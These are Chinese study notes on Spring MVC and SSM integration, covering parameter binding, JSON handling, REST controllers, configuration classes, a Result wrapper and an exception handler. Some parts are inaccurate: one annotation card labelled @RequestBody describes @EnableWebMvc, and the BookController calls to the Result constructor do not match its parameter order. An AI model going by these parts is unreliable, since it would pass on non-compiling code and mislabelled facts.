绑定参数关系\n\n\n@ResponseBody\n@RequestMapping(\"/commonParamDifferentName\")\npublic String commonParamDifferentName(@RequestParam(\"name\") String username, int age)&#123;\n    System.out.println(\"普通参数传递 userName==>\" + username);\n    System.out.println(\"普通参数传递 age==>\" + age);\n    return \"&#123;'module':'common Param Different Name'&#125;\";\n&#125;\n\n参数：\n\nrequired：是否为必传参数\ndefaultValue：参数默认值\n\n\n\n# 8.3 实体类参数\n\nPOJO 参数：请求参数名与形参对象属性名相同，且有 setter 方法，定义 POJO 类型形参即可接收\n\n\n@ResponseBody\n@RequestMapping(\"/pojoPram\")\npublic String pojoPram(User user) &#123;\n    System.out.println(\"pojo参数传递 user==>\" + user);\n    return \"&#123;'module':'pojoPram'&#125;\";\n&#125;\n# 8.4 嵌套实体类参数\n\n嵌套 POJO 参数：请求参数名与形参对象属性名相同，按照对象层次结构关系即可接收嵌套 POJO 属性参数\n\n\n@ResponseBody\n@RequestMapping(\"/pojoContainPojoPram\")\npublic String pojoContainPojoPram(User user) &#123;\n    System.out.println(\"pojo嵌套pojo参数传递 user==>\" + user);\n    return \"&#123;'module':'pojoContainPojoPram'&#125;\";\n&#125;\n# 8.5 数组参数\n\n数组参数：请求参数名与形参对象属性名相同且请求参数为多个，定义数组类型形参即可接收参数\n\n\n@ResponseBody\n@RequestMapping(\"/arrayParam\")\npublic String arrayParam(String[] likes) &#123;\n    System.out.println(\"数组参数传递 likes==>\" + Arrays.toString(likes));\n    return  \"&#123;'module':'arrayParam'&#125;\";\n&#125;\n# 8.6 集合保存普通参数\n\n集合保存普通参数：请求参数名与形参集合对象名相同且请求参数为多个，@RequestParam 绑定参数关系\n\n\n@ResponseBody\n@RequestMapping(\"/listParam\")\npublic String listParam(@RequestParam List&lt;String> likes)&#123;\n    System.out.println(\"集合参数传递 likes==>\" + likes);\n    return  \"&#123;'module':'listParam'&#125;\";\n&#125;\n# 8.7 总代码\npackage com.itheima.controller;\n\nimport com.itheima.domain.User;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.ResponseBody;\n\nimport java.lang.reflect.Array;\nimport java.util.Arrays;\nimport java.util.List;\n\n@Controller\npublic class UserController &#123;\n    @RequestMapping(\"/commonParam\")\n    @ResponseBody\n    public String commonParam(String name,int age)&#123;\n        System.out.println(\"普通参数传递 name==>\"+name);\n        System.out.println(\"普通参数传递 age==>\"+age);\n        return \"&#123;'module':'common param'&#125;\";\n    &#125;\n\n    @ResponseBody\n    @RequestMapping(\"/commonParamDifferentName\")\n    public String commonParamDifferentName(@RequestParam(\"name\") String username, int age)&#123;\n        System.out.println(\"普通参数传递 userName==>\" + username);\n        System.out.println(\"普通参数传递 age==>\" + age);\n        return \"&#123;'module':'common Param Different Name'&#125;\";\n    &#125;\n\n    @ResponseBody\n    @RequestMapping(\"/pojoPram\")\n    public String pojoPram(User user) &#123;\n        System.out.println(\"pojo参数传递 user==>\" + user);\n        return \"&#123;'module':'pojoPram'&#125;\";\n    &#125;\n\n\n    @ResponseBody\n    @RequestMapping(\"/pojoContainPojoPram\")\n    public String pojoContainPojoPram(User user) &#123;\n        System.out.println(\"pojo嵌套pojo参数传递 user==>\" + user);\n        return \"&#123;'module':'pojoContainPojoPram'&#125;\";\n    &#125;\n\n    @ResponseBody\n    @RequestMapping(\"/arrayParam\")\n    public String arrayParam(String[] likes) &#123;\n        System.out.println(\"数组参数传递 likes==>\" + Arrays.toString(likes));\n        return  \"&#123;'module':'arrayParam'&#125;\";\n    &#125;\n\n    @ResponseBody\n    @RequestMapping(\"/listParam\")\n    public String listParam(@RequestParam List&lt;String> likes)&#123;\n        System.out.println(\"集合参数传递 likes==>\" + likes);\n        return  \"&#123;'module':'listParam'&#125;\";\n    &#125;\n&#125;\n# 9、JSON 数据传递参数\n\n添加 json 数据转换相关坐标\n\n&lt;dependency>\n    &lt;groupId>com.fasterxml.jackson.core&lt;/groupId>\n    &lt;artifactId>jackson-databind&lt;/artifactId>\n    &lt;version>2.9.0&lt;/version>\n&lt;/dependency>\n\n设置发送 json 数据（请求 body 中添加 json 数据）\n\n\n\n开启自动转换 JSON 数据的支持\n\n@Configuration\n@ComponentScan(\"com.itheima.controller\")\n@EnableWebMvc\npublic class SpringMvcConfig &#123;\n&#125;\n\n设置注解 ==@RequestBody== 接收 JSON 数据\n\n@Controller\npublic class UserController &#123;\n    @RequestMapping(\"/listParamForJson\")\n    @ResponseBody\n    public String listParamForJson(@RequestBody List&lt;String> likes) &#123;\n        System.out.println(\"list common(json)参数传递 list==>\"+ likes);\n        return \"&#123;'module':'listParamForJson'&#125;\";\n    &#125;\n\n\n名称：@RequestBody\n\n\n类型：配置类注解\n\n\n位置：SpringMVC 配置类定义上方\n\n\n作用：开启 SpringMVC 多项辅助功能\n\n\n范例：\n@Configuration\n@ComponentScan(\"com.itheima.controller\")\n@EnableWebMvc\npublic class SpringMvcConfig &#123;\n&#125;\n\n\n\n\n名称：@RequestBody\n\n\n类型：形参注解\n\n\n位置：SpringMVC 控制器方法形参定义前面\n\n\n作用：将请求中请求体所包含的数据传递给请求参数，此注解一个处理器方法只能使用一次\n\n\n范例：\n@ResponseBody\n@RequestMapping(\"/listPojoParamForJson\")\npublic String listPojoParamForJson(@RequestBody List&lt;User> list) &#123;\nSystem.out.println(\"list pojo(json)参数传递 list==>\"+ list);\nreturn \"&#123;'module':'listPojoParamForJson'&#125;\";\n&#125;\n\n\n\n\n# 9.1 POJO 参数\n\nPOJO 参数：JSON 数据与形对象属性名相同，定义 POJO 类型即可接收参数\n\n\n@ResponseBody\n@RequestMapping(\"/pojoParamForJson\")\npublic String pojoParamForJson(@RequestBody User user) &#123;\n    System.out.println(\"pojo(json)参数传递 list==>\"+ user);\n    return \"&#123;'module':'pojoParamForJson'&#125;\";\n&#125;\n# 9.2 POJO 集合参数\n\nPOJO 集合参数：JSON 数组数据与集合泛型属性名相同，定义 List 类型形参即可接收参数\n\n\n@ResponseBody\n@RequestMapping(\"/listPojoParamForJson\")\npublic String listPojoParamForJson(@RequestBody List&lt;User> list) &#123;\n    System.out.println(\"list pojo(json)参数传递 list==>\"+ list);\n    return \"&#123;'module':'listPojoParamForJson'&#125;\";\n&#125;\n# 9.3 JSON 数组参数\n\nJSON 数组参数：\n\n@Controller\npublic class UserController &#123;\n    @RequestMapping(\"/listParamForJson\")\n    @ResponseBody\n    public String listParamForJson(@RequestBody List&lt;String> likes) &#123;\n        System.out.println(\"list common(json)参数传递 list==>\"+ likes);\n        return \"&#123;'module':'listParamForJson'&#125;\";\n    &#125;\n# 9.4 @RequestBody 与 @RequestParam 区别\n\n区别：\n\n@RequestParam 用于接收 url 地址传参，表单传参【application/×-www-form-urlencoded】\n@RequestBody 用于接收 json 数据【application/json】\n\n\n应用：\n\n后期开发中，发送 json 格式数据为主，@RequestBody 应用较广\n如果发送非 json 格式数据，选用 @RequestParam 接收请求参数\n\n\n\n# 10、日期类型参数传递\n\n\n日期类型数据基于系统不同格式也不同\n\n\n\n接收 形参时，根据不同的日期格式设置不同的接收方式\n@ResponseBody\n@RequestMapping(\"/date\")\npublic String getDate(Date date,\n                      @DateTimeFormat(pattern = \"yyyy-MM-dd\")Date date1,\n                      @DateTimeFormat(pattern = \"yyyy-MM-dd HH:mm:ss\")Date date2\n                     )&#123;\n    System.out.println(\"参数传递 date==>\" + date);\n    System.out.println(\"参数传递 date1 yyyy-NN-dd==>\" + date1);\n    System.out.println(\"参数传递 date2 yyyy-NN-dd HH:mm:ss==>\" + date2);\n    return \"&#123;'module':'date param'&#125;\";\n&#125;\nhttp:&#x2F;&#x2F;localhost&#x2F;date?date&#x3D;2055&#x2F;05&#x2F;21&amp;date1&#x3D;2022-04-21&amp;date2&#x3D;2022-01-21 13:23:22\n\n注解：\n\n名称：@DateTimeFormat\n类型：形参注解\n位置：SpringMVC 控制器方法形参里面\n作用：设定日期时间型数据格式\n属性：pattern：日期时间格式字符串\n\n\n\n\n\nConverter 接口\n\n\n类型转换器\n\n\n\n\n\n# 11、响应\n# 11.1 响应页面 / 跳转页面（了解）\n//响应页面/跳转页面\n//只适用@RequestMapping注解\n@RequestMapping(\"/toJumpPage\")\npublic String toJumpPage() &#123;\n    System.out.println(\"跳转页面\");\n    return \"page.jsp\";\n&#125;\n# 11.2 响应文本数据（了解）\n//响应文本数据\n@ResponseBody\n@RequestMapping(\"/toText\")\npublic String toText()&#123;\n    System.out.println(\"返回纯文本数据\");\n    return \"response text\";\n&#125;\n# 11.3 响应 JSON 数据（对象转 JSON）\n//响应POJO对象\n//return后可自动转，需要在pom里导入Jackson坐标\n@RequestMapping(\"/toJsonPojo\")\n@ResponseBody\npublic User toJsonPojo()&#123;\n    System.out.println(\"返回json对象数据\");\n    User user = new User();\n    user.setName(\"itcast\");\n    user.setAge(14);\n    return user;\n&#125;\n&lt;dependency>\n    &lt;groupId>com.fasterxml.jackson.core&lt;/groupId>\n    &lt;artifactId>jackson-databind&lt;/artifactId>\n    &lt;version>2.9.0&lt;/version>\n&lt;/dependency>\n# 11.4 响应 JSON 数据（对象集合转 JSON）\n//响应POJO集合对象\n@RequestMapping(\"/toJsonList\")\n@ResponseBody\npublic List&lt;User> toJsonList() &#123;\n    System.out.println(\"返回JSON集合数据\");\n    User user1 = new User();\n    User user2 = new User();\n    User user3 = new User();\n\n    user1.setName(\"传智播客\");\n    user1.setAge(13);\n\n    user2.setName(\"黑马\");\n    user2.setAge(15);\n\n    user3.setName(\"林青霞\");\n    user3.setAge(16);\n\n    List&lt;User> userList = new ArrayList&lt;>();\n    userList.add(user1);\n    userList.add(user2);\n    userList.add(user3);\n\n    return userList;\n&#125;\n\n注解：\n\n名称：@ResponseBody\n类型：方法注解\n位置：SpringMVC 控制器方法定义上方\n作用：设置当前控制器返回值作为响应体\n\n\nHttpMessageConverter 接口：类型转换器\n\n# 12、REST 风格简介\n\nREST（Representational State Transfer），表现形式状态转换\n\n传统风格资源描述形式\n\nhttp://localhost/user/getById?id=1\nhttp://localhost/user/saveUser\n\n\nREST 风格描述形式\n\nhttp://localhost/user/1\nhttp://localhost/user\n\n\n\n\n优点：\n\n书写简化\n隐藏访问的资源行为，无法通过地址得知对资源是何种操作\n\n\n按照 REST 风格访问资源时使用行为动作区分对资源进行了何种操作\n\nhttp://localhost/users\t查询全部用户信息  GET（查询）\nhttp://localhost/users/1      查询指定用户信息 GET（查询）\nhttp://localhost/users    添加用户信息 POST （新增 / 保存）\nhttp://localhost/users    修改用户信息 PUT （修改 / 更新）\nhttp://localhost/users/1    删除用户信息 DELETE （删除）\n\n\n根据 REST 风格对资源进行访问称为 RESTful\n注意事项：上述行为是约定方式，约定不是规范，可以打破，所以称 REST 风格，而不是 REST 规范；描述模块的名称通常是用复数，也就是加 s 的格式描述，表示此类资源，而非单个资源，例如 users、books、accounts…\n\n# 13、REST 入门案例\n\n\n设定 http 请求动作（动词）\n@RequestMapping(value = \"/users\",method = RequestMethod.POST)\n@ResponseBody\npublic String save()&#123;\n    System.out.println(\"user save ...\");\n    return \"&#123;'module':'user save'&#125;\";\n&#125;\n\n@RequestMapping(value = \"/users\",method = RequestMethod.PUT)\n@ResponseBody\npublic String update(@RequestBody User user) &#123;\n    System.out.println(\"user update ...\" + user);\n    return \"&#123;'module':'user update'&#125;\";\n&#125;\n\n\n设定请求参数（路径变量）\n@RequestMapping(value = \"/users/&#123;id&#125;\",method = RequestMethod.DELETE)\n@ResponseBody\npublic String delete(@PathVariable Integer id) &#123;\n    System.out.println(\"user delete ...\" + id);\n    return \"&#123;'module':'user delete'&#125;\";\n&#125;\n\n\n\n\n注解：\n\n名称：@RequestMapping\n类型：方法注解\n位置：SpringMVC 控制器方法定义上方\n作用：设置当前控制器方法请求访问路径\n属性：\n\nvalue（默认）：请求访问路径\nmethod：http 请求动作，标准动作 (GET/POST/PUT/DELETE)\n\n\n\n\n\n@RequestBody&amp;@RequestParam&amp;@PathVariable\n\n区别\n\n@RequestParam 用于接收 url 地址传参或表单传参\n@RequestBody 用于接受 JSON 数据\n@PathVariable 用于接收路径参数，使用 {参数名称} 描述路径参数\n\n\n应用\n\n后期开发中，发送请求超过 1 个参数时，以 JSON 格式为主，@RequestBody 应用较广\n如果发送非 JSON 格式数据，选用 @RequestParam 接收请求参数\n采用 RESTful 进行开发，当参数数量较少时，例如一个，可以采用 @PathVariable 接收请求路径变量，通常用于传递 id 值\n\n\n\npackage com.itheima.controller;\n\nimport com.itheima.domain.User;\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.*;\n\n@Controller\npublic class UserController2 &#123;\n    @RequestMapping(value = \"/users\",method = RequestMethod.POST)\n    @ResponseBody\n    public String save()&#123;\n        System.out.println(\"user save ...\");\n        return \"&#123;'module':'user save'&#125;\";\n    &#125;\n\n    @RequestMapping(value = \"/users/&#123;id&#125;\",method = RequestMethod.DELETE)\n    @ResponseBody\n    public String delete(@PathVariable Integer id) &#123;\n        System.out.println(\"user delete ...\" + id);\n        return \"&#123;'module':'user delete'&#125;\";\n    &#125;\n\n    @RequestMapping(value = \"/users\",method = RequestMethod.PUT)\n    @ResponseBody\n    public String update(@RequestBody User user) &#123;\n        System.out.println(\"user update ...\" + user);\n        return \"&#123;'module':'user update'&#125;\";\n    &#125;\n\n    @RequestMapping(value = \"/users/&#123;id&#125;\",method = RequestMethod.GET)\n    @ResponseBody\n    public String getById(@PathVariable Integer id) &#123;\n        System.out.println(\"user getById ...\" + id);\n        return \"&#123;'module':'user getById'&#125;\";\n    &#125;\n\n    @RequestMapping(value = \"/users\",method = RequestMethod.GET)\n    @ResponseBody\n    public String getAll()&#123;\n        System.out.println(\"user getAll ...\");\n        return \"&#123;'module':'user getAll'&#125;\";\n    &#125;\n\n&#125;\n\n\n# 14、RESTful 快速开发\n\n\n注解：\n\n\n名称：@RestController\n\n\n类型：类注解\n\n\n位置：基于 SpringMVC 的 RESTful 开发控制器类定义上方\n\n\n作用：设置当前控制器类为 RESTful 风格，等同于 @Controller 与 @ResponseBody 两个注解组合功能\n\n\n范例：\n@RestController\n@RequestMapping(\"/users\")\npublic class UserController2 &#123;\n&#125;\n\n\n\n\n注解：\n\n\n名称：@GetMapping @PostMapping @PutMapping @DeleteMapping\n\n\n类型：方法注解\n\n\n位置：基于 SpringMVC 的 RESTful 开发控制器方法定义上方\n\n\n作用：设置当前控制器方法请求访问路径与请求动作，每一种对应一个请求动作，例如 @GetMapping 对应 GET 请求\n\n\n范例：\n@GetMapping(\"/&#123;id&#125;\")\npublic String getById(@PathVariable Integer id) &#123;\n    System.out.println(\"user getById ...\" + id);\n    return \"&#123;'module':'user getById'&#125;\";\n&#125;\n\n\n属性：value (默认)：请求访问路径\n\n\n\n\n# 15、案例：基于 RESTful 页面数据交互\n\n放行非 SpringMVC 请求\n\npackage com.itheima.config;\n\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurationSupport;\n\n@Configuration\n//在扫描配置中加上这个包 // @ComponentScan(&#123;\"com.itheima.controller\",\"com.itheima.config\"&#125;)\npublic class SpringMvcSupport extends WebMvcConfigurationSupport &#123;\n    @Override\n    protected void addResourceHandlers(ResourceHandlerRegistry registry) &#123;\n        //当访问/pages/???时候不要走MVC，走/pages目录下的内容\n        registry.addResourceHandler(\"/pages/**\").addResourceLocations(\"/pages/\");\n        registry.addResourceHandler(\"/js/**\").addResourceLocations(\"/js/\");\n        registry.addResourceHandler(\"/css/**\").addResourceLocations(\"/css/\");\n        registry.addResourceHandler(\"/plugins/**\").addResourceLocations(\"/plugins/\");\n    &#125;\n&#125;\n# 16、SSM 整合\n# 16.1 整合流程\n\n创建工程\nSSM 整合\n\nSpring\n\nSpringConfig\n\n\nMyBatis\n\nMyBatisConfig\nJdbcConfig\njdbc.properties\n\n\nSpringMVC\n\nServletConfig\nSpringMVCConfig\n\n\n\n\n功能模块\n\n表与实体类\ndao（接口 + 自动代理）\nservice（接口 + 实现类）\n\n业务层接口测试（整合 junit）\n\n\nController\n\n表现层接口测试（PostMan）\n\n\n\n\n\n# 16.2 用到的所有依赖\n&lt;dependencies>\n    &lt;dependency>\n        &lt;groupId>junit&lt;/groupId>\n        &lt;artifactId>junit&lt;/artifactId>\n        &lt;version>4.11&lt;/version>\n        &lt;scope>test&lt;/scope>\n    &lt;/dependency>\n    &lt;!--    springweb-->\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-webmvc&lt;/artifactId>\n        &lt;version>5.2.10.RELEASE&lt;/version>\n    &lt;/dependency>\n    &lt;!--    spring-jdbc-->\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-jdbc&lt;/artifactId>\n        &lt;version>5.2.2.RELEASE&lt;/version>\n    &lt;/dependency>\n    &lt;!--    springtest-->\n    &lt;dependency>\n        &lt;groupId>org.springframework&lt;/groupId>\n        &lt;artifactId>spring-test&lt;/artifactId>\n        &lt;version>5.2.2.RELEASE&lt;/version>\n    &lt;/dependency>\n    &lt;!--    mybatis-->\n    &lt;dependency>\n        &lt;groupId>org.mybatis&lt;/groupId>\n        &lt;artifactId>mybatis&lt;/artifactId>\n        &lt;version>3.5.5&lt;/version>\n    &lt;/dependency>\n    &lt;!--    spring整和mybatis-->\n    &lt;dependency>\n        &lt;groupId>org.mybatis&lt;/groupId>\n        &lt;artifactId>mybatis-spring&lt;/artifactId>\n        &lt;version>1.3.0&lt;/version>\n    &lt;/dependency>\n    &lt;!--    mysql-->\n    &lt;dependency>\n        &lt;groupId>mysql&lt;/groupId>\n        &lt;artifactId>mysql-connector-java&lt;/artifactId>\n        &lt;version>8.0.15&lt;/version>\n    &lt;/dependency>\n    &lt;!--    德鲁伊-->\n    &lt;dependency>\n        &lt;groupId>com.alibaba&lt;/groupId>\n        &lt;artifactId>druid&lt;/artifactId>\n        &lt;version>1.1.16&lt;/version>\n    &lt;/dependency>\n    &lt;!--    servlet-->\n    &lt;dependency>\n        &lt;groupId>javax.servlet&lt;/groupId>\n        &lt;artifactId>javax.servlet-api&lt;/artifactId>\n        &lt;version>4.0.1&lt;/version>\n        &lt;scope>provided&lt;/scope>\n    &lt;/dependency>\n    &lt;!--    JSON-->\n    &lt;dependency>\n        &lt;groupId>com.fasterxml.jackson.core&lt;/groupId>\n        &lt;artifactId>jackson-databind&lt;/artifactId>\n        &lt;version>2.9.0&lt;/version>\n    &lt;/dependency>\n&lt;/dependencies>\n\n&lt;build>\n    &lt;plugins>\n        &lt;plugin>\n            &lt;groupId>org.apache.tomcat.maven&lt;/groupId>\n            &lt;artifactId>tomcat7-maven-plugin&lt;/artifactId>\n            &lt;version>2.2&lt;/version>\n            &lt;configuration>\n                &lt;port>80&lt;/port>\n                &lt;path>/&lt;/path>\n            &lt;/configuration>\n        &lt;/plugin>\n    &lt;/plugins>\n&lt;/build>\n# 16.2 创建 config 类\n# 16.2.1 SpringConfig\n@Configuration\n@ComponentScan(&#123;\"com.itheima.service\"&#125;)\npublic class SpringConfig &#123;\n&#125;\n# 16.2.2 整合 mybatis——JdbcConfig&amp;MybatisConfig\n\n在 SpringConfig 中添加 properties 目录和导入的配置文件类\n\n@Configuration\n@ComponentScan(&#123;\"com.itheima.service\"&#125;)\n@PropertySource(\"classpath:jdbc.properties\")\n@Import(&#123;JdbcConfig.class,MybatisConfig.class&#125;)\npublic class SpringConfig &#123;\n&#125;\n\nresources 目录下写 jdbc.properties\n\njdbc.driver=com.mysql.jdbc.Driver\njdbc.url=jdbc:mysql://localhost:3306/ssm_db\njdbc.username=root\njdbc.password=123456\n\njdbcConfig\n\npackage com.itheima.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\n\nimport javax.sql.DataSource;\n\n//因为SpringConfig有了@PropertySource(\"jdbc.properties\")，可以直接用@Value注解加载值\npublic class JdbcConfig &#123;\n    @Value(\"$&#123;jdbc.driver&#125;\")\n    private String driver;\n    @Value(\"$&#123;jdbc.url&#125;\")\n    private String url;\n    @Value(\"$&#123;jdbc.username&#125;\")\n    private String username;\n    @Value(\"$&#123;jdbc.password&#125;\")\n    private String password;\n    @Bean\n    public DataSource dataSource()&#123;\n        DruidDataSource druidDataSource = new DruidDataSource();\n        druidDataSource.setDriverClassName(driver);\n        druidDataSource.setUrl(url);\n        druidDataSource.setUsername(username);\n        druidDataSource.setPassword(password);\n        return druidDataSource;\n    &#125;\n&#125;\n\nMybatisConfig\n\npackage com.itheima.config;\n\nimport org.apache.ibatis.session.SqlSession;\nimport org.mybatis.spring.SqlSessionFactoryBean;\nimport org.mybatis.spring.mapper.MapperScannerConfigurer;\nimport org.springframework.context.annotation.Bean;\n\nimport javax.sql.DataSource;\n\npublic class MybatisConfig &#123;\n    @Bean\n    public SqlSessionFactoryBean sqlSessionFactory(DataSource dataSource)&#123;\n        SqlSessionFactoryBean factoryBean = new SqlSessionFactoryBean();\n        factoryBean.setDataSource(dataSource);\n        factoryBean.setTypeAliasesPackage(\"com.itheima.domain\");\n        return factoryBean;\n    &#125;\n\n    @Bean\n    public MapperScannerConfigurer mapperScannerConfigurer()&#123;\n        MapperScannerConfigurer msc = new MapperScannerConfigurer();\n        msc.setBasePackage(\"com.itheima.dao\");\n        return msc;\n    &#125;\n&#125;\n# 16.2.3 整合 SpringMVC\n\nSpringMVCConfig\n\npackage com.itheima.config;\n\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.EnableWebMvc;\n\n@Configuration\n@ComponentScan(\"com.itheima.controller\")\n@EnableWebMvc\npublic class SpringMvcConfig &#123;\n&#125;\n\nServletConfig\n\npackage com.itheima.config;\n\nimport org.springframework.web.servlet.support.AbstractAnnotationConfigDispatcherServletInitializer;\n\nimport java.util.logging.Filter;\n\npublic class ServletConfig extends AbstractAnnotationConfigDispatcherServletInitializer &#123;\n    @Override\n    protected Class&lt;?>[] getRootConfigClasses() &#123;\n        return new Class[]&#123;SpringConfig.class&#125;;\n    &#125;\n\n    @Override\n    protected Class&lt;?>[] getServletConfigClasses() &#123;\n        return new Class[]&#123;SpringMvcConfig.class&#125;;\n    &#125;\n\n    @Override\n    protected String[] getServletMappings() &#123;\n        return new String[]&#123;\"/\"&#125;;\n    &#125;\n&#125;\n# 16.2.4 事务整理\n\n\n开启注解式事务驱动\n@Configuration\n@ComponentScan(&#123;\"com.itheima.service\"&#125;)\n@PropertySource(\"classpath:jdbc.properties\")\n@Import(&#123;JdbcConfig.class,MybatisConfig.class&#125;)\n@EnableTransactionManagement//开启注解式事务驱动\npublic class SpringConfig &#123;\n&#125;\n\n\n编写事务管理器\npackage com.itheima.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.jdbc.datasource.DataSourceTransactionManager;\nimport org.springframework.transaction.PlatformTransactionManager;\n\nimport javax.sql.DataSource;\nimport javax.xml.crypto.Data;\n\npublic class JdbcConfig &#123;\n    @Value(\"$&#123;jdbc.driver&#125;\")\n    private String driver;\n    @Value(\"$&#123;jdbc.url&#125;\")\n    private String url;\n    @Value(\"$&#123;jdbc.username&#125;\")\n    private String username;\n    @Value(\"$&#123;jdbc.password&#125;\")\n    private String password;\n    @Bean\n    public DataSource dataSource()&#123;\n        DruidDataSource druidDataSource = new DruidDataSource();\n        druidDataSource.setDriverClassName(driver);\n        druidDataSource.setUrl(url);\n        druidDataSource.setUsername(username);\n        druidDataSource.setPassword(password);\n        return druidDataSource;\n    &#125;\n\n    @Bean\n    public PlatformTransactionManager platformTransactionManager(DataSource dataSource)&#123;\n        DataSourceTransactionManager ds = new DataSourceTransactionManager();\n        ds.setDataSource(dataSource);\n        return ds;\n    &#125;\n&#125;\n\n\n在类挂载事务管理器\n@Transactional\npublic interface BookService &#123;\n&#125;\n\n\n# 17、表现层数据封装 - 通信协议\n\n前端接收数据格式\n增删改\n查单条\n查全部\n前端接收数据格式 —— 创建结果模型类，封装数据到 data 属性中\n\n\n\n前端接收数据格式 —— 封装操作结果到 code 属性中\n\n\n\n前端接收数据格式 —— 封装特殊消息到 message (msg) 属性中\n\n\n\n设置统一数据返回结果类\n\npublic class Result&#123;\n    private Object data;\n    private Integer code;\n    private\tString msg;\n&#125;\n\n注意：result 类中的字段并不是固定的，可以根据需要自行增减，提供若干个构造方法，方便操作\n\n# 18、数据协议实现\n\n在 controller 包下创建 Result 类，提供三个属性，并提供多个构造方法\n\npackage com.itheima.controller;\n\npublic class Result &#123;\n    private Object data;\n    private Integer code;\n    private String msg;\n\n    public Object getData() &#123;\n        return data;\n    &#125;\n\n    public void setData(Object data) &#123;\n        this.data = data;\n    &#125;\n\n    public Integer getCode() &#123;\n        return code;\n    &#125;\n\n    public void setCode(Integer code) &#123;\n        this.code = code;\n    &#125;\n\n    public String getMsg() &#123;\n        return msg;\n    &#125;\n\n    public void setMsg(String msg) &#123;\n        this.msg = msg;\n    &#125;\n\n    public Result(Object data, Integer code, String msg) &#123;\n        this.data = data;\n        this.code = code;\n        this.msg = msg;\n    &#125;\n\n    public Result(Object data, Integer code) &#123;\n        this.data = data;\n        this.code = code;\n    &#125;\n\n    public Result() &#123;\n    &#125;\n&#125;\n\n在 controller 包下创建 Code 类，将所有的码值进行定义\n\npackage com.itheima.controller;\n\npublic class Code &#123;\n    public static final Integer SAVE_OK &#x3D; 20011;\n    public static final Integer DELETE_OK &#x3D; 20021;\n    public static final Integer UPDATE_OK &#x3D; 20031;\n    public static final Integer GET_OK &#x3D; 20041;\n\n    public static final Integer SAVE_ERR &#x3D; 20010;\n    public static final Integer DELETE_ERR &#x3D; 20020;\n    public static final Integer UPDATE_ERR &#x3D; 20030;\n    public static final Integer GET_ERR &#x3D; 20040;\n&#125;\n\n修改原来的控制类，将每个结果封装成 Result 类\n\npackage com.itheima.controller;\n\nimport com.itheima.domain.Book;\nimport com.itheima.service.BookService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.web.bind.annotation.*;\n\nimport java.util.List;\n\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController &#123;\n\n    @Autowired\n    private BookService bookService;\n\n    @PostMapping\n    public Result save(@RequestBody Book book) &#123;\n        boolean flag = bookService.save(book);\n        return new Result(flag?Code.SAVE_OK:Code.SAVE_ERR, flag);\n    &#125;\n\n    @PutMapping\n    public Result update(@RequestBody Book book) &#123;\n        boolean flag = bookService.update(book);\n        return new Result(flag?Code.UPDATE_OK:Code.UPDATE_ERR, flag);\n    &#125;\n\n    @DeleteMapping(\"/&#123;id&#125;\")\n    public Result delete(@PathVariable Integer id) &#123;\n        boolean flag = bookService.delete(id);\n        return new Result(flag?Code.DELETE_OK:Code.DELETE_ERR, flag);\n    &#125;\n\n    @GetMapping(\"/&#123;id&#125;\")\n    public Result getById(@PathVariable Integer id) &#123;\n        Book book = bookService.getById(id);\n\n        Integer code = book != null ?Code.GET_OK : Code.GET_ERR;\n        String msg = book != null ? \"\":\"数据查询失败，请重试\";\n\n        return new Result(code,book,msg);\n    &#125;\n\n    @GetMapping\n    public Result getAll() &#123;\n        List&lt;Book> books = bookService.getAll();\n\n        Integer code = books != null?Code.GET_OK : Code.GET_ERR;\n        String msg = books != null ? \"\" : \"数据查询失败，请重试\";\n\n        return new Result(code,books,msg);\n    &#125;\n&#125;\n# 19、异常处理器\n\n程序开发过程中不可避免的会遇到异常现象\n\n\n\n出现异常现象的常见位置与常见诱因如下\n\n框架内部抛出的异常：因使用不合规导致\n数据层抛出的异常：因外部服务器故障导致（例如：服务器访问超时）\n业务层抛出的异常：因业务逻辑书写错误导致（例如：遍历业务书写操作，导致索引异常等）\n表现层抛出的异常：因数据收集、校验等规则导致（例如：不匹配的数据类型间导致异常）\n工具类抛出的异常：因工具类书写不严谨不够健壮导致（例如：必要释放的连接长期未释放等）\n\n\n\n\n各层级均出现异常，异常处理代码书写在哪一层？—— 所有的异常均抛出到表现层进行处理\n表现层处理异常，每个方法中单独书写，代码书写量巨大且意义不强，如何解决 ——AOP 思想\n\n\n异常处理器：\n\n集中的、统一的处理项目中出现的异常\n\n\n\n\n\n在 controller 包下新建异常处理类 ProjectExceptionAdvice，原 controller 类代码不变\n\npackage com.itheima.controller;\n\nimport org.springframework.web.bind.annotation.ExceptionHandler;\nimport org.springframework.web.bind.annotation.RestControllerAdvice;\n\n@RestControllerAdvice\n//声明这个类是做异常处理的，SpringMVC配置要扫描到所在的包\npublic class ProjectExceptionAdvice &#123;\n    //定义处理异常的方法\n    @ExceptionHandler(Exception.class)\n    //注解声明负责处理哪种异常\n    public Result doException(Exception ex) &#123;\n        System.out.println(\"嘿嘿 异常你哪里跑\");\n        return new Result(666,null,\"嘿嘿 异常你哪里跑\");\n    &#125;\n&#125;\n注：如果要在别的包下建异常处理器，需要在 SpringMvcConfig 中添加这个包的路径\n\n\n\n\n注解：\n\n\n名称：@RestControllerAdvice\n\n\n类型：类注解\n\n\n位置：Rest 风格开发的控制器增强类定义上方\n\n\n作用：为 Rest 风格开发的控制器类做增强\n\n\n范例：\n@RestControllerAdvice\npublic class ProjectExceptionAdvice &#123;\n&#125;\n\n\n说明：此注解自带 @ResponseBody 注解与 @Component 